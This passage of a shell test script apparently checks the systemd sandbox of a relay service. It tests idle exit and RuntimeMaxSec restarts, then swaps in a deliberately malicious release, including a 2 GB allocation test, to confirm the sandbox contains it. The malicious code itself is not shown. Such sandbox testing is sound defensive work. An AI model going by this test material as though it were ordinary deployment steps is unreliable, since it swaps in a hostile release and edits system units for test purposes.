  t "R-14 the next call starts it again" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-14 no connection to the hub while idle" "no ESTABLISHED to 10.77.0.1:8443 from the relay" 're:^rc=0 0$' \
    "sleep 2; ss -Htn state established '( dport = :8443 )' | wc -l"
  # the hard end: RuntimeMaxSec kills the relay's whole cgroup; the door must still start it again
  printf '[Service]\nRuntimeMaxSec=4\n' > /etc/systemd/system/$SVC.d/60-test-short.conf; systemctl daemon-reload; restart_relay
  sed -i 's/^idle_exit=.*/idle_exit=600/' /etc/kaptyorka/relay.conf
  as kap-alice $ASOCK "{\"call\":\"inbox\",\"args\":{$CALLER}}" >/dev/null
  t "R-14 RuntimeMaxSec ends the relay (Result=timeout); the socket does not fail" "timeout; socket listening" \
    're:timeout listening' "sleep 7; echo \$(systemctl show -p Result --value $SVC) \$(systemctl show -p SubState --value kaptyorka-relay-box@alice.socket)"
  t "R-14 after the hard end the next call works" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  rm -f /etc/systemd/system/$SVC.d/60-test-short.conf; systemctl daemon-reload
  sed -i 's/^idle_exit=.*/idle_exit=10/' /etc/kaptyorka/relay.conf; restart_relay
  ;;

attack)
  # R-4 to R-12, R-11b, R-12b: a malicious release in the real unit
  ln -sfn /opt/kaptyorka/relay/evil /opt/kaptyorka/relay/current; restart_relay
  systemctl start $SVC
  for i in $(seq 60); do systemctl is-active -q $SVC || break; sleep 1; done
  INV=$(systemctl show -p InvocationID --value $SVC)
  journalctl -o cat _SYSTEMD_INVOCATION_ID="$INV" > /root/relay-attack.log 2>/dev/null
  [ -s /root/relay-attack.log ] || journalctl -u $SVC -o cat -n 400 > /root/relay-attack.log
  grep -a '^RESULT' /root/relay-attack.log | while IFS=$'\t' read -r _ id st exp act; do rec "$id" "$st" "$exp" "(malicious relay.py in the real unit)" "$act"; done
  t "R-12b unit result after the 2 GB allocation" "the child killed (oom-kill or rc!=0)" 're:(oom-kill|R-12b alloc 2GB child.PASS)' \
    "systemctl show $SVC -p Result -p MemoryMax -p MemorySwapMax | tr '\n' ' '; grep -a 'R-12b' /root/relay-attack.log | cut -f2,3"
  t "R-0 the attack ran to the end" "ATTACK-DONE in the journal" 're:ATTACK-DONE' 'grep -a ATTACK-DONE /root/relay-attack.log'
  ln -sfn /opt/kaptyorka/relay/0.9.39-s1 /opt/kaptyorka/relay/current; restart_relay
  t "R-0 honest release back" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  # the view check: a dropped root folder setting (as systemd drops TemporaryFileSystem=/ next to DynamicUser=)
  printf '[Service]\nRootDirectory=\n' > /etc/systemd/system/$SVC.d/70-test-noroot.conf; systemctl daemon-reload; restart_relay
  t "R-4d the relay's root folder setting removed: its view check stops it before it starts" "refused, names the extra folders" \
    're:its sandbox is not as set: / shows .*(data|kaptest-extra|home)' \
    "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'; sleep 1; journalctl -u $SVC -n 40 -o cat | grep -a 'sandbox is not as set' | tail -1"
  rm -f /etc/systemd/system/$SVC.d/70-test-noroot.conf; systemctl daemon-reload; restart_relay
  systemctl reset-failed kaptyorka-relay-box@alice.socket 2>/dev/null; systemctl restart kaptyorka-relay-box@alice.socket
  t "R-4d root folder back: the relay answers again" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  systemctl stop $SVC kaptyorka-relay-box@alice.socket kaptyorka-relay-box@bob.socket 'kaptest-*' 2>/dev/null; true
  ;;
esac
